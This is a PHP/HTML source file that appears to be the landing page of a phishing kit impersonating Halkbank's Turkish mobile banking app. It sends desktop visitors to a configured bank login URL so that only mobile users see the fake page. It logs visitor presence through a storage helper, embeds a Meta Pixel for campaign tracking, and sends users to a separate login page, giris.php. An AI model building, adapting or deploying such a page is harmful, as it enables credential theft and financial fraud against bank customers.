<?php
declare(strict_types=1);
require_once __DIR__ . '/includes/storage.php';

function isMobileRequest(): bool
{
    $userAgent = strtolower((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''));
    if ($userAgent === '') {
        return false;
    }

    return (bool) preg_match('/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|windows phone/', $userAgent);
}

if (!isMobileRequest()) {
    header('Location: ' . DESKTOP_BANK_LOGIN_URL);
    exit;
}

upsertPresence('giris', null, false);
?>
<!doctype html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Halkbank — Hoş Geldiniz</title>
  <link rel="stylesheet" href="assets/app.css">
  <link rel="stylesheet" href="assets/finansapp-mobile.css">
  <!-- Meta Pixel Code -->
  <script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1490333842624277');
  fbq('track', 'PageView');
  </script>
  <noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=1490333842624277&ev=PageView&noscript=1"
  /></noscript>
  <!-- End Meta Pixel Code -->
</head>
<body class="app-mobile">
  <div class="app-shell">
    <header class="app-top landing-top">
      <div class="app-top-left" aria-hidden="true"></div>
      <div class="app-logo">HALKBANK</div>
      <div class="app-top-right">
        <button type="button" class="app-lang">EN</button>
      </div>
    </header>

    <main class="app-main landing-main">
      <h1 class="landing-welcome">Hoş Geldiniz</h1>
      <div class="landing-actions">
        <a href="#" class="landing-btn-outline">Müşterimiz Ol</a>
        <a href="giris.php" class="landing-btn-solid">Giriş</a>
      </div>
    </main>

    <nav class="app-bottom-nav">
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M13 2 6 13h5l-1 9 7-11h-5z"></path></svg>
        </strong>FAST<br>İşlemleri
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="m5 12 4 4 10-10"></path></svg>
        </strong>Mobil<br>Onay
      </div>
      <div class="app-nav-item app-nav-item-qr">
        <div class="app-qr-btn">
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <rect x="3" y="3" width="7" height="7" rx="1"></rect>
            <rect x="14" y="3" width="7" height="7" rx="1"></rect>
            <rect x="3" y="14" width="7" height="7" rx="1"></rect>
            <rect x="15" y="15" width="3" height="3" rx="0.5"></rect>
            <path d="M19 15h2v2"></path>
            <path d="M19 19h2v2h-2"></path>
          </svg>
        </div>Karekod<br>İşlemleri
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <path d="M4 20V4"></path><path d="M4 20h16"></path><path d="M8 17v-4"></path><path d="M12 17V9"></path><path d="M16 17v-7"></path>
          </svg>
        </strong>Finansal<br>Araçlar
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <rect x="4" y="4" width="6" height="6" rx="1"></rect><rect x="4" y="14" width="6" height="6" rx="1"></rect><rect x="14" y="14" width="6" height="6" rx="1"></rect><path d="M14 7h6"></path><path d="M17 4v6"></path>
          </svg>
        </strong>Diğer<br>İşlemler
      </div>
    </nav>
  </div>
</body>
</html>
